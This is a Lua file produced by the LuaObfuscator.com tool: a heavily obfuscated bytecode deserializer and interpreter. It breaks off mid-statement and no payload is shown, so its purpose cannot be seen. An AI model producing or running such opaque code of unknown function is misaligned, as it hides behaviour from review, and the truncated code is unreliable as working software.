--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v87=0;while true do if (v87==0) then v19=v0(v3(v30,1,1));return "";end end else local v88=v2(v0(v30,16));if v19 then local v116=v5(v88,v19);v19=nil;return v116;else return v88;end end end);local function v20(v31,v32,v33) if v33 then local v89=(v31/((5 -3)^(v32-(2 -1))))%((3 -(1 + 0))^(((v33-(2 -1)) -(v32-(620 -(555 + 64)))) + (932 -(857 + 74)))) ;return v89-(v89%(569 -(367 + 201))) ;else local v90=2^(v32-((1805 -(282 + 595)) -(214 + 713))) ;return (((v31%(v90 + v90))>=v90) and ((1638 -(1523 + 114)) + 0)) or 0 ;end end local function v21() local v34=0 + 0 ;local v35;while true do if (v34==(1 -0)) then return v35;end if (v34==(1065 -((185 -(32 + 85)) + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -(226 + 1044)) ;v34=4 -3 ;end end end local function v22() local v36=0 + 0 ;local v37;local v38;while true do if (v36==(1 + 0)) then return (v38 * 256) + v37 ;end if (v36==((1307 -(87 + 263)) -(892 + 65))) then v37,v38=v1(v16,v18,v18 + (4 -2) );v18=v18 + (3 -1) ;v36=1 -0 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + (183 -((180 -113) + 113)) );v18=v18 + (5 -2) + 1 ;return (v42 * (12302277 + 4474939)) + (v41 * (260471 -(141892 + 53043))) + (v40 * (1208 -(802 + 150))) + v39 ;end local function v24() local v43=v23();local v44=v23();local v45=998 -(915 + 82) ;local v46=(v20(v44,2 -1 ,12 + 8 ) * ((2 -0)^(1219 -(1069 + (2031 -(1789 + 124)))))) + v43 ;local v47=v20(v44,18 + 3 ,70 -39 );local v48=((v20(v44,804 -(201 + 571) )==(1 -(0 + 0))) and  -(1 + 0)) or ((767 -(745 + 21)) + (0 -0)) ;if (v47==(0 -0)) then if (v46==(0 + 0)) then return v48 * (0 + 0) ;else local v117=(2176 -1385) -(368 + 423) ;while true do if (v117==((0 -0) -0)) then v47=19 -(1 + 9 + 8) ;v45=0 + 0 ;break;end end end elseif (v47==(7874 -5827)) then return ((v46==(442 -(416 + 26))) and (v48 * ((3 -2)/((1747 -(760 + 987)) + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(2446 -(630 + 793)) ) * (v45 + (v46/((6 -4)^(91 -39)))) ;end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(1056 -(87 + 968)) );v18=v18 + v49 ;local v51={};for v68=4 -3 , #v50 do v51[v68]=v2(v1(v3(v50,v68,v68)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v91,v92,v93,v94,v95,v96,v97,v98) local v91=(function() return 0 -0 ;end)();local v92=(function() return;end)();local v93=(function() return;end)();while true do if (v91~= #",") then else if (v92== #":") then v93=(function() return v94()~=0 ;end)();elseif (v92==2) then v93=(function() return v95();end)();elseif (v92~= #"-19") then else v93=(function() return v96();end)();end v97[v98]=(function() return v93;end)();break;end if (v91==0) then local v123=(function() return 0 -0 ;end)();local v124=(function() return;end)();while true do if (v123==(0 -0)) then v124=(function() return 867 -(550 + 317) ;end)();while true do if (v124~=0) then else v92=(function() return v94();end)();v93=(function() return nil;end)();v124=(function() return 1;end)();end if (v124~=1) then else v91=(function() return  #">";end)();break;end end break;end end end end return v91,v92,v93,v94,v95,v96,v97,v98;end;end)();local v53=(function() return function(v99,v100,v101,v102,v103,v104,v105,v106,v107) local v108=(function() return 0 -0 ;end)();local v99=(function() return;end)();local v100=(function() return;end)();while true do if (v108==(0 -0)) then local v125=(function() return 0 -0 ;end)();while true do if (v125~=(286 -(134 + 151))) then else v108=(function() return 1666 -(970 + 695) ;end)();break;end if ((0 -0)~=v125) then else v99=(function() return 1990 -(582 + 1408) ;end)();v100=(function() return nil;end)();v125=(function() return 1;end)();end end end if (v108==1) then while true do if (0~=v99) then else v100=(function() return v101();end)();if (v102(v100, #"~", #" ")~=0) then else local v129=(function() return 0;end)();local v130=(function() return;end)();local v131=(function() return;end)();local v132=(function() return;end)();while true do if (3==v129) then if (v102(v131, #"91(", #"91(")== #" ") then v132[ #"asd1"]=(function() return v105[v132[ #"0313"]];end)();end v106[v107]=(function() return v132;end)();break;end if (v129~=1) then else local v135=(function() return 0;end)();while true do if (v135==1) then v129=(function() return 6 -4 ;end)();break;end if (v135==0) then v132=(function() return {v103(),v103(),nil,nil};end)();if (v130==0) then local v358=(function() return 0;end)();local v359=(function() return;end)();while true do if (v358==(0 -0)) then v359=(function() return 0;end)();while true do if ((0 -0)==v359) then v132[ #"asd"]=(function() return v103();end)();v132[ #"0836"]=(function() return v103();end)();break;end end break;end end elseif (v130== #"/") then v132[ #"-19"]=(function() return v104();end)();elseif (v130==(1826 -(1195 + 629))) then v132[ #"-19"]=(function() return v104() -(2^(20 -4)) ;end)();elseif (v130~= #"gha") then else local v605=(function() return 241 -(187 + 54) ;end)();local v606=(function() return;end)();while true do if ((780 -(162 + 618))~=v605) then else v606=(function() return 0 + 0 ;end)();while true do if ((0 + 0)~=v606) then else v132[ #"asd"]=(function() return v104() -((3 -1)^16) ;end)();v132[ #"xnxx"]=(function() return v103();end)();break;end end break;end end end v135=(function() return 1 -0 ;end)();end end end if ((1 + 1)~=v129) then else if (v102(v131, #"[", #"[")~= #"{") then else v132[1638 -(1373 + 263) ]=(function() return v105[v132[2]];end)();end if (v102(v131,1002 -(451 + 549) ,2)== #"/") then v132[ #"-19"]=(function() return v105[v132[ #"xnx"]];end)();end v129=(function() return 3;end)();end if ((0 + 0)==v129) then local v136=(function() return 0 -0 ;end)();while true do if ((1 -0)~=v136) then else v129=(function() return 1385 -(746 + 638) ;end)();break;end if (v136==(0 + 0)) then v130=(function() return v102(v100,2, #"nil");end)();v131=(function() return v102(v100, #"asd1",6);end)();v136=(function() return 1;end)();end end end end end break;end end return v99,v100,v101,v102,v103,v104,v105,v106,v107;end end end;end)();local v54=(function() return function(v109,v110,v111) local v112=(function() return 0 -0 ;end)();local v113=(function() return;end)();while true do if (v112~=(341 -(218 + 123))) then else v113=(function() return 0;end)();while true do if (v113~=(1581 -(1535 + 46))) then else local v128=(function() return 0;end)();while true do if (v128~=0) then else local v133=(function() return 0;end)();while true do if ((0 + 0)~=v133) then else v109[v110-#"." ]=(function() return v111();end)();return v109,v110,v111;end end end end end end break;end end end;end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {v55,v56,nil,v57};end)();local v59=(function() return v23();end)();local v60=(function() return {};end)();for v70= #"/",v59 do FlatIdent_2661B,Type,Cons,v21,v24,v25,v60,v70=(function() return v52(FlatIdent_2661B,Type,Cons,v21,v24,v25,v60,v70);end)();end v58[ #"xnx"]=(function() return v21();end)();for v71= #":",v23() do FlatIdent_7366E,Descriptor,v21,v20,v22,v23,v60,v55,v71=(function() return v53(FlatIdent_7366E,Descriptor,v21,v20,v22,v23,v60,v55,v71);end)();end for v72= #".",v23() do v56,v72,v28=(function() return v54(v56,v72,v28);end)();end return v58;end local function v29(v62,v63,v64) local v65=v62[1 + 0 ];local v66=v62[562 -(306 + (675 -(275 + 146))) ];local v67=v62[605 -(512 + 90) ];return function(...) local v73=v65;local v74=v66;local v75=v67;local v76=v27;local v77=1 + 0 ;local v78= -(1 -0);local v79={};local v80={...};local v81=v12("#",...) -(1468 -(899 + 568)) ;local v82={};local v83={};for v114=0 + 0 ,v81 do if (v114>=v75) then v79[v114-v75 ]=v80[v114 + (2 -1) ];else v83[v114]=v80[v114 + (604 -(268 + 335)) ];end end local v84=(v81-v75) + (291 -(60 + 38 + 192)) ;local v85;local v86;while true do local v115=0 + 0 ;while true do if (v115==(573 -(426 + (210 -(29 + 35))))) then if (v86<=(3 + 22)) then if ((v86<=(1 + 11)) or (878>=3222)) then if (v86<=(1461 -(282 + 1174))) then if (v86<=(813 -(569 + 242))) then if (v86<=(0 -0)) then v83[v85[1 + 1 ]]=v29(v74[v85[1027 -(706 + 318) ]],nil,v64);elseif (v86==((5584 -4324) -(233 + 1026))) then local v195=1251 -(721 + 530) ;local v196;local v197;while true do if ((1273 -(945 + 326))==v195) then v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[2 + 0 ]]=v83[v85[703 -(271 + 429) ]][v85[4 + 0 ]];v195=1 + 2 ;end if (v195==(0 + 0)) then v196=nil;v197=nil;v83[v85[1502 -(1408 + 92) ]]=v64[v85[(896 -596) -(36 + 261) ]];v195=(4798 -3711) -(461 + 408 + 217) ;end if (v195==(1295 -(993 + 295))) then v83[v197](v13(v83,v197 + 1 + 0 ,v85[3 + 0 ]));v77=v77 + (1172 -(418 + 753)) ;v85=v73[v77];v195=8;end if ((v195==(2 + 2)) or (254>=3289)) then v196=v83[v85[1 + 2 ]];v83[v197 + 1 + 0 ]=v196;v83[v197]=v196[v85[323 -(134 + 185) ]];v195=2 + 3 ;end if ((v195==(1136 -(549 + 584))) or (2711<=705)) then v77=v77 + (530 -(406 + 123)) ;v85=v73[v77];v197=v85[1771 -((2761 -(53 + 959)) + 20) ];v195=1 + (411 -(312 + 96)) ;end if (v195==(1323 -(1249 + 73))) then v77=v77 + (1 -0) + 0 ;v85=v73[v77];v83[v85[(1432 -(147 + 138)) -(466 + 679) ]]=v83[v85[9 -6 ]][v85[9 -5 ]];v195=5 -(902 -(813 + 86)) ;end if (v195==(1906 -(106 + 1794))) then v77=v77 + 1 + 0 + 0 ;v85=v73[v77];v197=v85[2];v195=3 + (7 -3) ;end if ((v195==(2 + 3)) or (2506>=3366)) then v77=v77 + (2 -(493 -(18 + 474))) ;v85=v73[v77];v83[v85[5 -3 ]]=v85[117 -(4 + 110) ];v195=590 -(57 + 527) ;end if (v195==(3 + 5)) then do return;end break;end end else local v198=v85[7 -5 ];do return v83[v198](v13(v83,v198 + (1428 -(41 + 1386)) ,v85[106 -(17 + 86) ]));end end elseif (v86<=(7 -4)) then v83[v85[2 + 0 ]]=v63[v85[7 -4 ]];elseif (v86==4) then local v199=(0 + 0) -0 ;local v200;while true do if (v199==(0 -0)) then v200=v85[3 -1 ];v83[v200](v13(v83,v200 + (2 -1) ,v85[169 -(122 + 44) ]));break;end end else for v360=v85[5 -3 ],v85[1271 -(1249 + 19) ] do v83[v360]=nil;end end elseif (v86<=8) then if (v86<=(6 + 0)) then local v144;v83[v85[(1093 -(860 + 226)) -5 ]][v85[1089 -(686 + (703 -(121 + 182))) ]]=v83[v85[6 -2 ]];v77=v77 + (3 -2) ;v85=v73[v77];v83[v85[2 + 0 ]]=v83[v85[1 + 2 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[2]]=v85[814 -(721 + 90) ];v77=v77 + 1 + 0 + 0 ;v85=v73[v77];v83[v85[(1243 -(988 + 252)) -1 ]]=v85[9 -(1 + 5) ];v77=v77 + (66 -(30 + 35)) ;v85=v73[v77];v144=v85[1 + 1 + 0 ];v83[v144]=v83[v144](v13(v83,v144 + (471 -((2194 -(49 + 1921)) + 246)) ,v85[1260 -(1043 + 214) ]));v77=v77 + 1 ;v85=v73[v77];v83[v85[(893 -(223 + 667)) -1 ]][v85[11 -8 ]]=v83[v85[1216 -(323 + 889) ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[5 -3 ]]=v83[v85[583 -((413 -(51 + 1)) + 219) ]];v77=v77 + (321 -(53 + (458 -191))) ;v85=v73[v77];v83[v85[1 + 1 ]]=v85[416 -(15 + 398) ];v77=v77 + (983 -(18 + 964)) ;v85=v73[v77];v83[v85[7 -5 ]]=v85[1996 -(1238 + 755) ];v77=v77 + 1 + 0 ;v85=v73[v77];v144=v85[2 + (0 -0) ];v83[v144]=v83[v144](v13(v83,v144 + 1 + 0 ,v85[853 -(20 + 830) ]));elseif (v86==(6 + 1)) then local v201=v85[128 -(116 + (1135 -(146 + 979))) ];local v202,v203=v76(v83[v201](v83[v201 + (1 -0) ]));v78=(v203 + v201) -(1 + 0) ;local v204=738 -(153 + 389 + (801 -(311 + 294))) ;for v362=v201,v78 do local v363=0 -(0 -0) ;while true do if ((v363==(0 + 0)) or (123>746)) then v204=v204 + 1 + 0 ;v83[v362]=v202[v204];break;end end end else local v205=v85[1 + 0 + 1 ];local v206,v207=v76(v83[v205](v13(v83,v205 + (2 -1) ,v85[7 -4 ])));v78=(v207 + v205) -(1552 -(1126 + 425)) ;local v208=405 -(118 + 287) ;for v364=v205,v78 do v208=v208 + ((1446 -(496 + 947)) -2) ;v83[v364]=v206[v208];end end elseif (v86<=(1131 -((1476 -(1233 + 125)) + 1003))) then if (v86==(26 -17)) then v83[v85[379 -(142 + 235) ]]=v83[v85[13 -10 ]] + v85[1 + 1 + 2 ] ;else local v210=0;local v211;local v212;local v213;while true do if ((v210==(0 + 0)) or (4444<=894)) then v211=v85[979 -(553 + 424) ];v212=v83[v211 + (3 -1) ];v210=1 + 0 ;end if (v210==(2 -1)) then v213=v83[v211] + v212 ;v83[v211]=v213;v210=2 + 0 ;end if ((1376>583) and (v210==(2 + 0))) then if (v212>(0 + 0)) then if (v213<=v83[v211 + 1 + 0 ]) then v77=v85[6 -(3 + 0) ];v83[v211 + (4 -1) ]=v213;end elseif ((v213>=v83[v211 + (2 -(1 + 0)) ]) or (2427==2455)) then local v609=0 -0 ;while true do if ((3393>=2729) and (v609==(1963 -(556 + 1407)))) then v77=v85[6 -(1648 -(963 + 682)) ];v83[v211 + 1 + 2 ]=v213;break;end end end break;end end end elseif (v86==((45 + 8) -42)) then if  not v83[v85[755 -(239 + 514) ]] then v77=v77 + (1505 -(504 + 1000)) + 0 ;else v77=v85[1332 -(797 + 532) ];end else local v214=v85[2 + 0 ];local v215=v83[v85[2 + 1 ]];v83[v214 + (2 -1) ]=v215;v83[v214]=v215[v85[1206 -(373 + 829) ]];end elseif (v86<=(749 -(476 + 255))) then if (v86<=(1145 -(369 + 761))) then if (v86<=(4 + 9)) then local v165=0 + 0 ;local v166;local v167;local v168;while true do if (v165==(1 + 0)) then v168={};v167=v10({},{__index=function(v440,v441) local v442=v168[v441];return v442[3 -2 ][v442[2 -0 ]];end,__newindex=function(v443,v444,v445) local v446=0 -0 ;local v447;while true do if ((4175==4175) and ((0 -0)==v446)) then v447=v168[v444];v447[239 -(64 + 174) ][v447[2 + 0 ]]=v445;break;end end end});v165=1 + 1 ;end if ((4584>1886) and (v165==2)) then for v448=1,v85[5 -1 ] do v77=v77 + (337 -(144 + 192)) ;local v449=v73[v77];if (v449[217 -(42 + 174) ]==(15 + 4)) then v168[v448-1 ]={v83,v449[3 + 0 ]};else v168[v448-(1505 -(363 + 1141)) ]={v63,v449[3 + 0 ]};end v82[ #v82 + 1 + 0 ]=v168;end v83[v85[1977 -(1913 + 62) ]]=v29(v166,v167,v64);break;end if ((v165==(0 + 0)) or (1043>=2280)) then v166=v74[v85[7 -4 ]];v167=nil;v165=(2098 -(149 + 15)) -((1525 -(890 + 70)) + 1368) ;end end elseif (v86>(52 -38)) then local v219=0 + (117 -(39 + 78)) ;local v220;local v221;local v222;local v223;local v224;while true do if (v219==(1118 -(628 + 490))) then v220=nil;v221,v222=nil;v223=nil;v224=nil;v83[v85[1663 -(1477 + 184) ]]=v64[v85[3 -(482 -(14 + 468)) ]];v219=1 + 0 ;end if ((v219==(861 -(564 + 292))) or (667<71)) then v77=v77 + (775 -(431 + (753 -410))) ;v85=v73[v77];v83[v85[2 -0 ]]();v77=v77 + (2 -(2 -1)) ;v85=v73[v77];v219=310 -(244 + 60) ;end if ((4 + 0)==v219) then for v592=v224,v78 do v220=v220 + (477 -(41 + 435)) ;v83[v592]=v221[v220];end v77=v77 + (16 -(6 + 9)) ;v85=v73[v77];v224=v85[1003 -(938 + 33 + 30) ];v83[v224]=v83[v224](v13(v83,v224 + 1 + 0 ,v78));v219=3 + 2 ;end if (((678 + 450) -(936 + 189))==v219) then v85=v73[v77];v224=v85[1 + 1 ];v221,v222=v76(v83[v224](v13(v83,v224 + (1614 -(1565 + 48)) ,v85[2 + 1 ])));v78=(v222 + v224) -(1139 -(782 + 356)) ;v220=267 -(176 + 91) ;v219=10 -6 ;end if (((2 -0)==v219) or (4482<2793)) then v83[v224]=v223[v85[1321 -(486 + 831) ]];v77=v77 + (1093 -(975 + 117)) ;v85=v73[v77];v83[v85[1877 -(157 + 1718) ]]=v85[3 + 0 ];v77=v77 + (3 -2) ;v219=10 -7 ;end if ((1019 -(697 + 69 + 252))==v219) then v77=v77 + (2 -1) ;v85=v73[v77];v224=v85[1 + 1 ];v223=v83[v85[3]];v83[v224 + (1 -0) ]=v223;v219=4 -2 ;end if (v219==(3 + 3)) then v77=v85[5 -2 ];break;end end else v83[v85[5 -3 ]]= #v83[v85[(177 + 213) -(371 + 16) ]];end elseif (v86<=(1243 -(322 + 905))) then local v169=611 -(602 + 9) ;local v170;while true do if ((561<4519) and (v169==(1195 -(449 + 740)))) then v83[v85[874 -(826 + 46) ]]=v85[950 -(245 + 702) ];break;end if ((v169==(0 -0)) or (677==1434)) then v170=nil;v83[v85[1 + 1 ]]=v85[1901 -(260 + 1638) ];v77=v77 + (441 -(382 + 58)) ;v85=v73[v77];v170=v85[6 -4 ];v169=1 + 0 ;end if ((2827==2827) and (v169==(3 -1))) then v85=v73[v77];v83[v85[5 -3 ]]=v83[v85[1208 -(902 + 303) ]];v77=v77 + (1 -0) ;v85=v73[v77];v83[v85[(2 + 2) -2 ]]=v85[1 + 2 ];v169=1693 -(1121 + 569) ;end if (v169==(217 -(22 + 192))) then v77=v77 + (684 -(483 + 200)) ;v85=v73[v77];v83[v85[1465 -(1404 + 59) ]]=v85[8 -5 ];v77=v77 + (1 -0) ;v85=v73[v77];v169=4 -0 ;end if ((770 -(468 + 297))==v169) then v77=v77 + (1799 -(690 + 1108)) ;v85=v73[v77];v83[v85[564 -(334 + 228) ]]=v83[v85[10 -7 ]];v77=v77 + (2 -1) ;v85=v73[v77];v169=10 -4 ;end if (v169==1) then v83[v170]=v83[v170](v13(v83,v170 + 1 + 0 ,v85[239 -(141 + 95) ]));v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[4 -2 ]][v85[6 -3 ]]=v83[v85[1 + 3 ]];v77=v77 + (2 -1) ;v169=2;end if ((3 + 1)==v169) then v170=v85[2 + (0 -0) ];v83[v170]=v83[v170](v13(v83,v170 + (572 -(47 + 524)) ,v85[2 + 1 ]));v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[(2 + 0) -0 ]][v85[2 + 1 ]]=v83[v85[8 -4 ]];v169=168 -(92 + (249 -178)) ;end end elseif (v86>(1 + 16)) then v83[v85[6 -4 ]]=v83[v85[2 + 1 ]][v85[483 -(341 + 4 + 134) ]];else local v228=v85[(52 -(12 + 39)) + 1 ];do return v13(v83,v228,v78);end end elseif (v86<=(43 -22)) then if (v86<=(345 -(89 + 237))) then v83[v85[2 -0 ]]=v83[v85[768 -(574 + 191) ]];elseif (v86==(17 + 3)) then local v229=0 -0 ;while true do if (v229==(4 + 3)) then v83[v85[851 -(237 + 17 + 595) ]]=v64[v85[1223 -(855 + 365) ]];v77=v77 + (127 -((170 -115) + 71)) ;v85=v73[v77];v229=10 -2 ;end if (v229==(2 + 3)) then v83[v85[1792 -(573 + 1217) ]]=v64[v85[8 -5 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v229=1 + 5 ;end if (v229==(5 -1)) then v83[v85[(3351 -2410) -(714 + 225) ]]=v83[v85[8 -(2 + 3) ]][v85[5 -(1 + 0) ]];v77=v77 + 1 + (0 -0) ;v85=v73[v77];v229=74 -(10 + 59) ;end if ((2556==2556) and (v229==(0 -0))) then v83[v85[808 -(118 + 688) ]]={};v77=v77 + (49 -(25 + 23)) ;v85=v73[v77];v229=1 + 0 ;end if ((v229==(1888 -(927 + 639 + 320))) or (3106>=4932)) then v83[v85[1217 -(369 + (4088 -3242)) ]]=v83[v85[10 -7 ]][v85[(2446 -(1596 + 114)) -(16 + 716) ]];v77=v77 + (1 -0) ;v85=v73[v77];v229=3 + 0 ;end if (v229==(9 -3)) then v83[v85[2]]=v83[v85[100 -(11 + (224 -138)) ]][v85[4]];v77=v77 + (204 -(11 + (905 -(164 + 549)))) ;v85=v73[v77];v229=16 -9 ;end if (v229==(293 -(175 + 110))) then if ( not v83[v85[2]] or (1217<=503)) then v77=v77 + (2 -1) ;else v77=v85[14 -11 ];end break;end if (v229==(1799 -((1941 -(1059 + 379)) + 1293))) then v83[v85[5 -3 ]]=v64[v85[3 + (0 -0) ]];v77=v77 + (1062 -(810 + 131 + 120)) ;v85=v73[v77];v229=3 + 1 ;end if (v229==1) then v83[v85[1 + 1 ]]=v64[v85[3 + 0 ]];v77=v77 + ((91 + 443) -(43 + 490)) ;v85=v73[v77];v229=735 -(711 + 22) ;end end else local v230=v85[(399 -(145 + 247)) -5 ];local v231,v232=v76(v83[v230](v13(v83,v230 + (860 -(240 + 619)) ,v78)));v78=(v232 + v230) -(1 + 0 + 0) ;local v233=0 -0 ;for v395=v230,v78 do v233=v233 + 1 + 0 ;v83[v395]=v231[v233];end end elseif ((v86<=(69 -46)) or (441>=4871)) then if (v86>(1766 -(1344 + 400))) then v83[v85[407 -(255 + 150) ]]=v83[v85[3]]%v83[v85[4 + 0 ]] ;else local v235;v235=v85[3 -1 ];v83[v235]=v83[v235](v13(v83,v235 + 1 + 0 ,v85[11 -8 ]));v77=v77 + (4 -(2 + 1)) ;v85=v73[v77];v83[v85[6 -4 ]][v85[1742 -(404 + 1335) ]]=v83[v85[410 -(183 + 223) ]];v77=v77 + (1 -0) ;v85=v73[v77];v83[v85[2]]=v83[v85[(14 -9) -2 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 + 0 ]]=v85[2 + 1 ];v77=v77 + (338 -(10 + 327)) ;v85=v73[v77];v83[v85[2 + 0 ]]=v85[7 -4 ];v77=v77 + (434 -(279 + 154)) ;v85=v73[v77];v235=v85[340 -(118 + 220) ];v83[v235]=v83[v235](v13(v83,v235 + 1 + 0 ,v85[452 -(108 + 341) ]));v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[8 -6 ]][v85[2 + 1 + 0 ]]=v83[v85[1497 -(711 + 782) ]];v77=v77 + ((1 -0) -0) ;v85=v73[v77];v83[v85[(1191 -(254 + 466)) -(270 + 199) ]]=v83[v85[1 + 2 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[977 -((1375 -(544 + 16)) + 160) ]]=v85[12 -9 ];v77=v77 + (1820 -(580 + 1239)) ;v85=v73[v77];v83[v85[5 -3 ]]=v85[3 + 0 ];end elseif ((3751>731) and (v86==(1 + 23))) then local v256=(6016 -4123) -(1222 + 671) ;local v257;while true do if ((v256==(0 + 0)) or (2515<1804)) then v257=v85[4 -2 ];v83[v257]=v83[v257](v13(v83,v257 + 1 + 0 ,v78));break;end end else local v258=1167 -(645 + 522) ;while true do if (v258==(1792 -(1010 + (1408 -(294 + 334))))) then v83[v85[2 + (253 -(236 + 17)) ]][v83[v85[1 + 2 ]]]=v83[v85[3 + 1 ]];v77=v77 + (4 -3) ;v85=v73[v77];v258=8 -5 ;end if (v258==(1841 -(451 + 594 + 791))) then v83[v85[4 -2 ]][v83[v85[4 -1 ]]]=v85[9 -5 ];v77=v77 + (506 -(351 + 154)) ;v85=v73[v77];v258=1580 -(998 + 283 + 293) ;end if (v258==(0 -0)) then v83[v85[2 + 0 ]]=v83[v85[(1012 -743) -(28 + 238) ]][v85[8 -4 ]];v77=v77 + (1560 -(1381 + (842 -664))) ;v85=v73[v77];v258=1 + 0 + 0 ;end if (v258==(5 + 1)) then v83[v85[2]]=v85[2 + 1 ];break;end if ((3008>1924) and (v258==(3 -2))) then v83[v85[2 + 0 ]]=v83[v85[473 -(381 + 89) ]][v85[4 + 0 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v258=2 -0 ;end if ((295==295) and (v258==(3 + 0))) then v83[v85[1158 -(1074 + 82) ]]=v64[v85[1018 -(657 + 358) ]];v77=v77 + (2 -1) ;v85=v73[v77];v258=(7 + 1) -4 ;end if ((4828>=1725) and (v258==(1788 -((1008 -(413 + 381)) + 1570)))) then v83[v85[(62 + 1395) -(990 + 465) ]]=v83[v85[1 + 2 ]][v85[2 + 2 ]];v77=v77 + ((3 -1) -1) ;v85=v73[v77];v258=1837 -(1552 + (727 -447)) ;end end end elseif (v86<=38) then if ((v86<=((1984 -(582 + 1388)) + 17)) or (4201<2150)) then if (v86<=(28 + 0)) then if (v86<=(58 -32)) then v77=v85[11 -(13 -5) ];elseif (v86>(1270 -(157 + 1086))) then v83[v85[1728 -(1668 + 58) ]]();else local v259=v85[628 -(512 + 82 + 32) ];v83[v259](v13(v83,v259 + (2 -1) ,v78));end elseif (v86<=((423 -(326 + 38)) -30)) then v83[v85[2 -0 ]][v83[v85[10 -7 ]]]=v83[v85[5 -1 ]];elseif (v86>((2511 -1662) -(599 + 220))) then v83[v85[(3 -0) -1 ]]={};else local v261=v85[1 + 1 ];v83[v261]=v83[v261](v13(v83,v261 + 1 + 0 ,v85[3 + 0 ]));end elseif (v86<=(114 -(700 -(47 + 573)))) then if ((v86<=(2026 -(109 + 1885))) or (3076>=4666)) then v83[v85[1471 -(1269 + 200) ]]=v83[v85[8 -5 ]][v85[7 -3 ]];v77=v77 + (816 -(98 + 717)) ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[829 -(802 + 24) ]][v85[6 -2 ]];v77=v77 + (1 -0) ;v85=v73[v77];v83[v85[1 + 1 ]][v83[v85[2 + 1 + 0 ]]]=v83[v85[1 + 3 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[5 -3 ]]=v64[v85[9 -6 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[(12 -9) + (0 -0) ]][v85[18 -14 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[1436 -(797 + 636) ]][v85[19 -15 ]];v77=v77 + (1620 -(1427 + 192)) ;v85=v73[v77];v83[v85[1 + 1 ]][v83[v85[3 + 0 ]]]=v83[v85[8 -4 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[2 + 0 ]]=v85[81 -(23 + 55) ];v77=v77 + (2 -1) ;v85=v73[v77];v77=v85[2 + 1 ];elseif (v86>33) then v83[v85[328 -(192 + 134) ]]=v83[v85[(2943 -(1269 + 395)) -(316 + 960) ]][v85[3 + 1 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[2 + 0 ]][v83[v85[(495 -(76 + 416)) + 0 ]]]=v85[4];v77=v77 + (3 -2) ;v85=v73[v77];v83[v85[553 -(83 + 468) ]]=v64[v85[1809 -(1202 + 604) ]];v77=v77 + (4 -(446 -(319 + 124))) ;v85=v73[v77];v83[v85[2 -(0 -0) ]]=v83[v85[8 -5 ]][v85[6 -(1009 -(564 + 443)) ]];v77=v77 + (28 -(10 + 17)) ;v85=v73[v77];v83[v85[327 -(45 + (775 -495)) ]][v83[v85[461 -(337 + 121) ]]]=v85[4 + 0 ];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 ]]=v85[2 + 1 ];else local v276=0 + 0 ;while true do if (v276==(0 -(0 -0))) then v83[v85[1 + 1 ]]=v83[v85[1914 -(340 + 1571) ]][v85[2 + 2 ]];v77=v77 + ((5905 -4132) -(1733 + 39)) ;v85=v73[v77];v276=2 -(1912 -(1261 + 650)) ;end if ((v276==(1040 -(125 + 909))) or (2027>=3030)) then v77=v85[1951 -(1096 + 852) ];break;end if (v276==(1 + 0)) then v83[v85[2 -0 ]][v83[v85[3 + 0 + 0 ]]]=v85[516 -(409 + 103) ];v77=v77 + (237 -(46 + 190)) ;v85=v73[v77];v276=97 -(51 + 44) ;end if ((1228 -(109 + 1114))==v276) then v83[v85[(1 -0) + 1 ]]=v85[1320 -(1114 + 203) ];v77=v77 + (727 -(228 + (2315 -(772 + 1045)))) ;v85=v73[v77];v276=248 -(6 + 236) ;end if (v276==(1 + 3)) then v83[v85[2 + 0 ]][v83[v85[(1 + 5) -3 ]]]=v85[667 -(174 + 489) ];v77=v77 + (2 -1) ;v85=v73[v77];v276=1910 -(830 + 1075) ;end if (v276==(527 -(303 + 221))) then v83[v85[1271 -(231 + 1038) ]]=v83[v85[3 + 0 ]][v85[1166 -((315 -(102 + 42)) + 991) ]];v77=v77 + 1 + 0 ;v85=v73[v77];v276=16 -12 ;end if (v276==(5 -3)) then v83[v85[409 -(174 + 233) ]]=v64[v85[(1852 -(1524 + 320)) -5 ]];v77=v77 + (2 -1) ;v85=v73[v77];v276=3 + 0 ;end end end elseif (v86<=(126 -90)) then if (v86>((1370 -(1049 + 221)) -65)) then local 